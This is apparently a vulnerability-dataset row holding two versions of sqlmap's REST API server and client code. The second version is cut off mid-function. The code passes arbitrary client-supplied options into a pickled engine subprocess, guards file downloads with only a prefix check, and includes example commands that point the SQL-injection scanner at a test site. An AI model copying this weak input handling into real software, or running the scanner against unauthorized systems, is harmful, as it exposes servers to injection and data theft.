    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))
    # Prevent file path traversal
    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    if os.path.isfile(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",0
53,b4bb4c393b26072b9a47f787be134888b983af60,"/lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
